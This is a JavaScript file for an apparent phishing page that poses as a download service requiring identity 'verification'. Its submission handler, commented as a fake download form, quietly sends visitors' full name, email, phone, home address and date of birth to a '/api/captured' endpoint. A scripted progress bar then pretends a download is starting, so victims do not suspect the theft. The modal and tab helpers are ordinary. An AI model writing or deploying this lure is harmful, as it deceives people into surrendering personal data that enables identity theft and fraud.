// ---- Modal helpers ----
function openModal(id) {
  document.querySelectorAll('.modal').forEach(m => m.classList.remove('active'));
  document.getElementById('modal-overlay').classList.add('active');
  const el = document.getElementById(id);
  if (el) el.classList.add('active');
}

function closeAllModals() {
  document.querySelectorAll('.modal').forEach(m => m.classList.remove('active'));
  document.getElementById('modal-overlay').classList.remove('active');
}

document.addEventListener('keydown', e => {
  if (e.key === 'Escape') closeAllModals();
});

// ---- Fake download form submission ----
function submitVerification(event, modalId) {
  event.preventDefault();
  const form = event.target;
  const data = {
    source: modalId,
    full_name:     form.full_name.value,
    email:         form.email.value,
    phone:         form.phone.value,
    home_address:  form.home_address.value,
    date_of_birth: form.date_of_birth.value,
  };

  fetch('/api/captured', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
  }).catch(() => {}); // silently ignore network errors

  // Close form modal, show success
  document.getElementById(modalId).classList.remove('active');
  openModal('success-modal');
  animateProgress();
}

function animateProgress() {
  const bar   = document.getElementById('progress-bar');
  const label = document.getElementById('progress-label');
  const steps = [
    [15,  500,  'Verifying identity…'],
    [45,  1200, 'Connecting to download server…'],
    [70,  2000, 'Preparing download…'],
    [100, 3200, 'Download starting…'],
  ];
  steps.forEach(([pct, delay, text]) => {
    setTimeout(() => {
      bar.style.width = pct + '%';
      label.textContent = text;
    }, delay);
  });
}

// ---- Tab switching ----
function showTab(name) {
  document.querySelectorAll('.tab-content').forEach(tc => tc.style.display = 'none');
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.getElementById('tab-' + name).style.display = 'block';
  event.target.classList.add('active');
}
